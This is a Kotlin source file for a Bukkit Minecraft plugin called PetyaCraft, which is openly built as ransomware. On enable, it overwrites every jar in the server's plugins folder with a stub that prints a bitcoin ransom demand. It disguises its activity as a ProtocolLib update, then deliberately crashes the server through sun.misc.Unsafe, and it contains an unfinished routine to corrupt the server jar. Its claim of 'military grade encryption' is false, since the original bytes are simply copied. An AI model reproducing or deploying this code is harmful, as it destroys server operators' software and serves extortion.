package me.ezeh.ransome.petyacraft

import com.squareup.javapoet.JavaFile
import com.squareup.javapoet.MethodSpec
import com.squareup.javapoet.TypeSpec
import org.bukkit.Bukkit
import org.bukkit.plugin.java.JavaPlugin
import sun.misc.Unsafe
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.util.*
import java.util.jar.JarFile
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.lang.model.element.Modifier.PUBLIC
import javax.tools.JavaFileObject
import javax.tools.ToolProvider


class PetyaCraft(bitcoinAddress: String = generateBitcoinAddress()) : JavaPlugin() {

    private var self: File? = null

    val ANSI_WHITE = "\u001B[37m"
    val ANSI_RED_BACKGROUND = "\u001B[41m"
    val ANSI_RESET = "\u001B[0m"
    val PETYA = ANSI_RED_BACKGROUND + ANSI_WHITE
    private val onEnableMethod = MethodSpec.methodBuilder("onEnable")
            .addModifiers(PUBLIC)
            .returns(Void.TYPE)
            .addStatement("System.out.println(\$S)",
                    """
${PETYA}You became victim of the PETYACRAFT RANSOMEWARE
${PETYA}The plugins on your server have been encrypted with a Military grade encryption algorithm. There is no way to restore your data without a special key.
${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddress`$ANSI_RESET
""")
            .build()

    private fun createRansomeClass(): JavaFile {
        val mainClass = "PetyaCraft"
        val getEncryptedMethod = MethodSpec.methodBuilder("getEncrypted")
                .addModifiers(PUBLIC)
                .returns(java.lang.String::class.java)

                .addStatement("\$T var1 = new \$T()", StringBuilder::class.java, StringBuilder::class.java)
                .addStatement("\$T var2 = new \$T(new \$T(this.getClass().getClassLoader().getResourceAsStream(\"encrypted.raw\")));", BufferedReader::class.java, BufferedReader::class.java, InputStreamReader::class.java)
                .addStatement("String var3 = new String()")

                .beginControlFlow("try")
                .beginControlFlow("while((var3 = var2.readLine()) != null)")
                .addStatement("var1.append(var3)")
                .endControlFlow()
                .endControlFlow()

                .beginControlFlow("catch(Exception e)")
                .addStatement("return \$S", "Ha! You no longer have your files!")
                .endControlFlow()

                .addStatement("return var1.toString()")
                .build()

        val finished = TypeSpec.classBuilder(mainClass)
                .superclass(JavaPlugin::class.java)
                .addModifiers(PUBLIC)
                .addMethod(onEnableMethod)
                .addMethod(getEncryptedMethod)
                .build()
        val jFile = JavaFile.builder("protocolhacked", finished).build()
        return jFile

    }

    fun compileString(code: String): ByteArray {
        val compiler = ToolProvider.getSystemJavaCompiler()

        val compilationUnit = CodeGenMeta.StringJavaFileObject("PetyaCraft", code)

        val fileManager = CodeGenMeta.SimpleJavaFileManager(compiler.getStandardFileManager(null, null, null))

        val compilationTask = compiler.getTask(null, fileManager, null, null, null, Arrays.asList<JavaFileObject>(compilationUnit))

        compilationTask.call()
        println(fileManager.generatedOutputFiles.map { it.className })
        return fileManager.generatedOutputFiles[0].bytes

    }

    override fun onEnable() {
        val uPlugins = File("plugins/").listFiles().filter { it.name.endsWith(".jar") && it.isFile }
        for (file in uPlugins) {
            try {
                if (canEncrypt(file)) {
                    encrypt(file)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        /*
        println("ProtocolLib update finished, please restart")
            Bukkit.getPluginManager().disablePlugin(this)
            System.exit(0) // closes the server hopefully without raising any suspicion
        */ // Nope, never mind. We're going to cause havoc
        Bukkit.getPluginManager().disablePlugin(this)
    }

    private fun encrypt(file: File) {
        val raw = file.readBytes()
        val rcb = createRansomeClass()
        // val cw = ClassWriter(ClassReader("protocolhacked.PetyaCraft"), 0)
        println("Applying ProtocolLib -> ${file.name ?: ""}")
        val code = compileString(rcb.toString())
        val zout = ZipOutputStream(FileOutputStream(file))

        zout.putNextEntry(ZipEntry("nocrypt.txt"))
        zout.write("nocrypt".toByteArray())
        zout.closeEntry()

        zout.putNextEntry(ZipEntry("encrypted.raw"))
        zout.write(raw)
        zout.closeEntry()

        zout.putNextEntry(ZipEntry("protocolhacked/PetyaCraft.class"))
        zout.write(code)
        zout.closeEntry()

        val pluginymlString = """
author: spammy23
authors: [spammy23]
description: PetyaCraft - I encrypted your files (ID = (${generateBitcoinAddress()}))
main: protocolhacked.PetyaCraft
name: PetyaCraft
version: 1.0
"""
        zout.putNextEntry(ZipEntry("plugin.yml"))
        zout.write(pluginymlString.toByteArray())
        zout.closeEntry()

        zout.flush()
        zout.close()
    }

    override fun onDisable() {
        if (self != null) {
            self?.delete() // not important if the plugin is not deleted
        }
        // overwriteServer() //TODO finish this method
        println("Update failed...")
        println("Fixing... Error about to occur, please restart afterwards")
        crash()
    }

    private fun overwriteServer() {
        TODO("FINISH")
        val serverJarFile = JarFile(getServerJar())
        val entries = serverJarFile.entries()
        serverJarFile.close()
        val zout = ZipOutputStream(FileOutputStream(getServerJar()))
        for (entry in entries) {
            zout.putNextEntry(entry)
            if (entry.name == "org/bukkit/craftbukkit/Main.class") {
                zout.write(compileString(createRansomeClass().toString()))
            } else {
                zout.write(serverJarFile.getInputStream(entry).readBytes())
            }
            zout.closeEntry()
        }
    }

    private fun canEncrypt(file: File): Boolean {
        if (!file.isFile) return false
        val jf = JarFile(file)
        try {
            val nc = jf.getInputStream(jf.getEntry("nocrypt.txt")).reader().readText()
            if (nc == "original") try {
                self = file // Delete and leave little to no trace (Other than the 'encrypted' files)
            } catch(e: Exception) {
                return false
            }
            return nc != "nocrypt" || nc != "original"
        } catch (e: Exception) {
            return true
        }
    }

    private fun crash() {
        // Code from Redrield
        val unsafeField = Unsafe::class.java.getDeclaredField("theUnsafe")
        unsafeField.isAccessible = true
        val unsafe = unsafeField.get(null) as Unsafe
        unsafe.putAddress(0, 0)

    }

    private fun getServerJar(): File {

        val dir = File(PetyaCraft::class.java.protectionDomain.codeSource.location.toURI().path)
        val jar = System.getProperty("java.class.path")
        return File(dir, jar)

    }
}

fun generateBitcoinAddress(): String {
    val alphabet = "abcdefghjklmnpqrstuvwxyz123456789" // Not completely random as the Os the Is and the 0s have been removed
    val random = Random()
    val sb = StringBuilder()
    sb.append(if (random.nextBoolean()) 1 else 3)
    val maxLength = 33
    val minLength = 26
    for (i in 0..random.nextInt(maxLength) + minLength) {
        var char = alphabet[random.nextInt(alphabet.length)]
        if (random.nextBoolean()) char = char.toUpperCase()
        sb.append(char)
    }
    return sb.toString()
}